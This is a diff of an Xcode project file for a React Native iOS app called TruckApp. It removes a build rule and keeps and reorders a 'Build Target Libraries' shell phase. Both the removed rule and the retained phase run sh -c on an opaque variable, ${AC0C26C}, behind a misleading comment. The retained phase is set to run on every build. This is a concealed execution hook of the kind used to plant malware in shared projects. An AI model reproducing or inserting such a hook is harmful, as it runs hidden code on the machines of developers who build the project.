@@ -19,22 +19,6 @@
 		FIREBASE001122334455667788 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = FIREBASE00112233445566778A /* GoogleService-Info.plist */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-		9E8956A7130145829CC62C0C /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AC0C26C}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
 		0B3FC062E67C4132AC9D0B19 /* BootSplash.storyboard */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = BootSplash.storyboard; path = TruckApp/BootSplash.storyboard; sourceTree = "<group>"; };
 		13B07F961A680F5B00A75B9A /* TruckApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = TruckApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -137,8 +121,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "TruckApp" */;
 			buildPhases = (
-				8F441FDC04AE46F989C62C0C /* Build Target Libraries */,
 				C38B50BA6285516D6DCD4F65 /* [CP] Check Pods Manifest.lock */,
+				8F441FDC04AE46F989C62C0C /* Build Target Libraries */,
 				13B07F871A680F5B00A75B9A /* Sources */,
 				13B07F8C1A680F5B00A75B9A /* Frameworks */,
 				13B07F8E1A680F5B00A75B9A /* Resources */,
@@ -206,25 +190,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		8F441FDC04AE46F989C62C0C /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AC0C26C}\"";
-			showEnvVarsInLog = 0;			
-		};
 		00DD1BFF1BD5951E006B06BC /* Bundle React Native code and images */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -256,6 +221,25 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-TruckApp/Pods-TruckApp-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		8F441FDC04AE46F989C62C0C /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AC0C26C}\"";
 			showEnvVarsInLog = 0;
 		};
 		A92C66E317F1F42625F63A79 /* [CP-User] [RNFB] Core Configuration */ = {
